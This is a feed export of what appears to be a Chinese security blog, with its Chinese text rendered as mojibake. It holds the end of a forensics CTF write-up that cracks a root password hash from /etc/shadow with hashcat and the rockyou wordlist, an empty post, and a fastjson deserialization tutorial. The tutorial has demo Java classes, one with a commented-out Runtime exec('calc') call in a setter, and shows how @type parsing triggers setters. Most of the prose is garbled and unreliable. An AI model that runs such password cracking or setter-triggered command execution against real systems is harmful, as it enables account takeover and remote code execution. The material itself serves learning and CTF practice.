6.3<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200631298.png" class="">  </p><h2 id="13-è¯·åˆ†æè¯¥æœåŠ¡å™¨é•œåƒæœ€é«˜æƒé™â€œrootâ€è´¦æˆ·çš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼ša123456ï¼‰"><a href="#13-è¯·åˆ†æè¯¥æœåŠ¡å™¨é•œåƒæœ€é«˜æƒé™â€œrootâ€è´¦æˆ·çš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼ša123456ï¼‰" class="headerlink" title="13.è¯·åˆ†æè¯¥æœåŠ¡å™¨é•œåƒæœ€é«˜æƒé™â€œrootâ€è´¦æˆ·çš„å¯†ç æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼ša123456ï¼‰"></a>13.è¯·åˆ†æè¯¥æœåŠ¡å™¨é•œåƒæœ€é«˜æƒé™â€œrootâ€è´¦æˆ·çš„å¯†ç æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼ša123456ï¼‰</h2><p>åœ¨ç«çœ¼ä¸­æŸ¥çœ‹etc/shadow<br>ç„¶åä½¿ç”¨hashcatæ¥çˆ†ç ´<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat  -a 0 &#x27;$1$kmYU/aog$fKIF3ugewwCTuPWOSksjD/&#x27; /usr/share/wordlists/rockyou.txt --force --self-test-disable </span><br></pre></td></tr></table></figure><br>ä¸€èˆ¬liunxä¸‹çš„åŠ å¯†æ–¹æ³•ä¸º<code>sha512crypt $6$, SHA512 (Unix)</code>å³ -m 1800ã€‚è€Œwinä¸€èˆ¬ä¸º 1000ã€‚å½“ç„¶è¿™é¢˜å°±æ˜¯æ™®é€šçš„md5</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjsonåŸç”Ÿååºåˆ—åŒ–</title>
      <link href="/2024/10/19/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/10/19/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> fastjsonååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastJsonååºåˆ—åŒ–</title>
      <link href="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ¬äººæœ€è¿‘è¿™æ®µæ—¶é—´æ‰å¼€å§‹å­¦javaï¼Œå¦‚æœ‰å‡ºé”™è¯·å„ä½å¤§ä½¬æŒ‡æ­£"><a href="#æœ¬äººæœ€è¿‘è¿™æ®µæ—¶é—´æ‰å¼€å§‹å­¦javaï¼Œå¦‚æœ‰å‡ºé”™è¯·å„ä½å¤§ä½¬æŒ‡æ­£" class="headerlink" title="æœ¬äººæœ€è¿‘è¿™æ®µæ—¶é—´æ‰å¼€å§‹å­¦javaï¼Œå¦‚æœ‰å‡ºé”™è¯·å„ä½å¤§ä½¬æŒ‡æ­£"></a>æœ¬äººæœ€è¿‘è¿™æ®µæ—¶é—´æ‰å¼€å§‹å­¦javaï¼Œå¦‚æœ‰å‡ºé”™è¯·å„ä½å¤§ä½¬æŒ‡æ­£</h1><h1 id="fastJsonååºåˆ—åŒ–å…¶å®åº”è¯¥åˆ†ä¸ºä¸¤ç§-ä¸€ç§æ˜¯é€šè¿‡JSON-parse-payload-æ—¶è°ƒç”¨äº†æœ¬åœ°ç±»ä¸­çš„setteræ³•ä»è€Œå¯¼è‡´çš„å‘½ä»¤æŒ‡å‘ã€‚ç¬¬äºŒç§å°±æ˜¯fastJsonçš„åŸç”Ÿååºåˆ—åŒ–äº†ï¼Œå³readObjectè§¦å‘çš„ååºåˆ—åŒ–ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å…ˆå†™ä¸€ä¸‹ç¬¬ä¸€ç§çš„"><a href="#fastJsonååºåˆ—åŒ–å…¶å®åº”è¯¥åˆ†ä¸ºä¸¤ç§-ä¸€ç§æ˜¯é€šè¿‡JSON-parse-payload-æ—¶è°ƒç”¨äº†æœ¬åœ°ç±»ä¸­çš„setteræ³•ä»è€Œå¯¼è‡´çš„å‘½ä»¤æŒ‡å‘ã€‚ç¬¬äºŒç§å°±æ˜¯fastJsonçš„åŸç”Ÿååºåˆ—åŒ–äº†ï¼Œå³readObjectè§¦å‘çš„ååºåˆ—åŒ–ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å…ˆå†™ä¸€ä¸‹ç¬¬ä¸€ç§çš„" class="headerlink" title="fastJsonååºåˆ—åŒ–å…¶å®åº”è¯¥åˆ†ä¸ºä¸¤ç§,ä¸€ç§æ˜¯é€šè¿‡JSON.parse(payload);æ—¶è°ƒç”¨äº†æœ¬åœ°ç±»ä¸­çš„setteræ³•ä»è€Œå¯¼è‡´çš„å‘½ä»¤æŒ‡å‘ã€‚ç¬¬äºŒç§å°±æ˜¯fastJsonçš„åŸç”Ÿååºåˆ—åŒ–äº†ï¼Œå³readObjectè§¦å‘çš„ååºåˆ—åŒ–ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å…ˆå†™ä¸€ä¸‹ç¬¬ä¸€ç§çš„"></a>fastJsonååºåˆ—åŒ–å…¶å®åº”è¯¥åˆ†ä¸ºä¸¤ç§,ä¸€ç§æ˜¯é€šè¿‡JSON.parse(payload);æ—¶è°ƒç”¨äº†æœ¬åœ°ç±»ä¸­çš„setteræ³•ä»è€Œå¯¼è‡´çš„å‘½ä»¤æŒ‡å‘ã€‚ç¬¬äºŒç§å°±æ˜¯fastJsonçš„åŸç”Ÿååºåˆ—åŒ–äº†ï¼Œå³readObjectè§¦å‘çš„ååºåˆ—åŒ–ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘å…ˆå†™ä¸€ä¸‹ç¬¬ä¸€ç§çš„</h1><h1 id="fastJsonçš„åŸºç¡€ä½¿ç”¨æ–¹æ³•ä¸ä¸€äº›ç‰¹æ€§çš„ä»‹ç»"><a href="#fastJsonçš„åŸºç¡€ä½¿ç”¨æ–¹æ³•ä¸ä¸€äº›ç‰¹æ€§çš„ä»‹ç»" class="headerlink" title="fastJsonçš„åŸºç¡€ä½¿ç”¨æ–¹æ³•ä¸ä¸€äº›ç‰¹æ€§çš„ä»‹ç»"></a>fastJsonçš„åŸºç¡€ä½¿ç”¨æ–¹æ³•ä¸ä¸€äº›ç‰¹æ€§çš„ä»‹ç»</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//DEMO.java</span></span><br><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(JSON.toJSONString(user))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„DEMOè¿è¡Œçš„ç»“æœå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å‚</span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;benben&quot;&#125;</span><br><span class="line"></span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;age&quot;:19,&quot;name&quot;:&quot;benben&quot;&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶ä¸ä»…è¾“å‡ºäº†jsonçš„å†…å®¹è¿˜è¾“å‡ºäº†getAgeå’Œgetnameè¿™ä¹Ÿå°±è¯æ˜äº†åœ¨æˆ‘ä»¬ä½¿ç”¨<code>JSON.toJSONString(user, SerializerFeature.WriteClassName);</code>å»å°†ç±»åºåˆ—åŒ–ä¸ºjsonæ—¶è§¦å‘äº†ç±»çš„getteræ–¹æ³•ã€‚<br>è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„jsonå­—ç¬¦ä¸²å½“æˆ‘ä»¬ä½¿ç”¨JSON.toJSONStringæœ‰åœ¨æœ‰ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸ºSerializerFeature.WriteClassNameæ—¶ä¼šåœ¨å‰é¢åŠ ä¸€ä¸ª@typeå³å…¶æ ‡è®°äº†è¿™ä¸ªç±»çš„ç±»å‹ã€‚<br>è€Œç›´æ¥ä½¿ç”¨çš„è¯å°±æ²¡æœ‰æ ‡è®°ç±»çš„ç±»å</p><p>æˆ‘ä»¬åœ¨å°è¯•å°†å…¶å­—ç¬¦ä¸²ååºåˆ—åŒ–<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.User\&quot;,\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;<span class="comment">//å½“æˆ‘ä»¬ç›´æ¥ä½¿ç”¨JSON.toJSONString(user)æ¥åºåˆ—åŒ–æ—¶å°±æ˜¯è¿™ä¸ªç»“æœï¼Œå°‘äº†ä¸ªç±»çš„ç±»å‹çš„é”®å€¼å¯¹</span></span><br><span class="line">        System.out.println(JSON.parseObject(json, User.class)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parse(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json2, User.class)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parseObject(json2)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        System.out.println(JSON.parse(json2)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„è¾“å‡ºç»“æœå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">æ— å‚</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@7a4f0f29</span><br><span class="line"></span><br><span class="line">æ— å‚</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">getAge</span><br><span class="line">getname</span><br><span class="line">&#123;&quot;haha&quot;:&quot;aaa&quot;,&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br><span class="line"></span><br><span class="line">æ— å‚</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@4ee285c6</span><br><span class="line"></span><br><span class="line">æ— å‚</span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">fastjson.User@621be5d1</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;benben&quot;,&quot;age&quot;:3&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°åªæœ‰é€šè¿‡@TypeæŒ‡å®šç±»æˆ–è€…åœ¨parseObjectç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šç±»äº†æ‰èƒ½å¤Ÿè¾“å‡ºç±»ã€‚<br>æˆ‘ä»¬å¯ä»¥å‘ç°é™¤äº†æœ€åä¸¤ä¸ªå…¶ä»–çš„å§¿åŠ¿éƒ½å¯ä»¥è§¦å‘setterã€‚</p><h2 id="å°è¯•åˆ é™¤å±æ€§"><a href="#å°è¯•åˆ é™¤å±æ€§" class="headerlink" title="å°è¯•åˆ é™¤å±æ€§"></a>å°è¯•åˆ é™¤å±æ€§</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getHaha&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DEMO.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.User\&quot;,\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;,\&quot;haha\&quot;:\&quot;aaa\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;benben\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        System.out.println(JSON.parseObject(json)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line">setAge</span><br><span class="line">setname</span><br><span class="line">getAge</span><br><span class="line">getHaha</span><br><span class="line">getname</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶æˆåŠŸè¾“å‡ºäº†getterå’Œsetterï¼Œå³getterå’Œsetterçš„è§¦å‘ä¸æ˜¯å¦å®šä¹‰äº†å±æ€§æ— å…³ï¼Œä¸‹é¢çš„è°ƒè¯•è¿‡ç¨‹ä¸­ä¹Ÿä¼šè®²åˆ°ï¼Œå› ä¸ºå…¶æ˜¯ç›´æ¥é€šè¿‡åå°„æ¥è·å–æ‰€æœ‰çš„methodï¼Œç„¶åå†è¿‡æ»¤ç„¶å‡ºsetterï¼Œåå†åå°„è°ƒç”¨</p><h1 id="ä¸ºä»€ä¹ˆä¼šè§¦å‘setterä¸getter-ä»£ç è°ƒè¯•"><a href="#ä¸ºä»€ä¹ˆä¼šè§¦å‘setterä¸getter-ä»£ç è°ƒè¯•" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šè§¦å‘setterä¸getter(ä»£ç è°ƒè¯•)"></a>ä¸ºä»€ä¹ˆä¼šè§¦å‘setterä¸getter(ä»£ç è°ƒè¯•)</h1><p>æƒ³è¦æ·±å…¥äº†è§£è¿™ä¸ªæ¡†æ¶æ¼æ´çš„æˆå› ï¼Œä»¥åŠäº†è§£ä¹‹åbypasså’ŒåŸç†ä»£ç çš„è°ƒè¯•æ˜¯å°‘ä¸äº†çš„ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text"><br>æˆ‘ä»¬ç®€å•è°ƒè¯•ä¸€ä¸‹è¿™ä¸ªè¾“å‡ºæ‰€æœ‰getterå’Œsetterçš„ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"><br>æˆ‘ä»¬åœ¨æ­¥å…¥parseObjectåå¯ä»¥å‘ç°å…¶è°ƒç”¨äº†ä¸€ä¸ªparse()ï¼Œè€Œåä½¿ç”¨<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>æˆ‘ä»¬å…ˆæ­¥è¿‡ä¸€äº›parse()ä¼šå‘ç°æ§åˆ¶å°è¾“å‡ºäº†setAgeå’ŒsetNameã€‚å³å…¶è§¦å‘äº†setæ–¹æ³•</p><p>é‚£ä¹ˆä¹‹åè§¦å‘getteræ–¹æ³•çš„åœ°æ–¹åº”è¯¥å°±æ˜¯åœ¨JSON.toJSON(obj)äº†ã€‚</p><h2 id="æ€ä¹ˆè§¦å‘çš„setter"><a href="#æ€ä¹ˆè§¦å‘çš„setter" class="headerlink" title="æ€ä¹ˆè§¦å‘çš„setter"></a>æ€ä¹ˆè§¦å‘çš„setter</h2><p>æˆ‘ä»¬å…ˆè°ƒè¯•ä¸€ä¸‹parseçœ‹çœ‹å…¶æ˜¯æ€ä¹ˆè§¦å‘setterçš„<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>æ­¥å…¥parseæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å…ˆä½¿ç”¨DefaultJSONPaseræ¥å¯¹textå³æˆ‘ä»¬ä¼ å…¥çš„jsonå­—ç¬¦è¿›è¡Œå¤„ç†ï¼ˆå¹¶ä¸æ˜¯å¾ˆé‡è¦ï¼‰ï¼Œè¿™é‡Œæˆ‘å°±ä¸æ­¥å…¥äº†<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br>æ­¥å…¥parse.parseæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶èµ‹å€¼äº†åº”è¯¥lexerã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class="" title="alt text"><br>è¿™ä¸ªlexerå…¶å®å°±æ˜¯ä¸€ä¸ªåŒ…å«äº†textå’Œä¸€äº›å…¶ä»–ç”¨æ¥æè¿°textçš„å±æ€§çš„ç±»<br>ä¹‹åè¿›å…¥ä¸€ä¸ªswitchè¯­å¥ï¼Œè¿™ä¸ªswitchè¯­å¥çš„ä½œç”¨å°±æ˜¯åŒ¹é…ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºä»€ä¹ˆã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class="" title="alt text"><br>å› ä¸ºç¬¬ä¸€ä¸ªæ˜¯å·¦å¤§æ‹¬å·æ‰€æœ‰è¿›å…¥LBRACEã€‚æˆ‘ä»¬å¯ä»¥å‘ç°å…¶åˆå®ä¾‹åŒ–ä¸€ä¸ªJSONObjectï¼Œä¹‹åå†è°ƒç”¨parseObjectæ–¹æ³•ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class="" title="alt text"><br>ç®€å•è°ƒä¸€ä¸‹ä¼šå‘ç°ç¬¬ä¸€ä¸ªObjectè¿”å›çš„æ˜¯ä¸€ä¸ªHashMapã€‚<br>æˆ‘ä»¬æ­¥å…¥parseObject<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class="" title="alt text"><br>ä¹‹åå°±æ˜¯åˆ©ç”¨æ­»å¾ªç¯æ¥åˆ¤æ–­<code>&#123;</code>ä¸‹ä¸€ä¸ªçš„å­—ç¬¦æ˜¯ä¸ºå•å¼•å·è¿˜æ˜¯åŒå¼•å·(æˆ‘ä»¬çš„æ˜¯åŒå¼•å·)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">    key = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    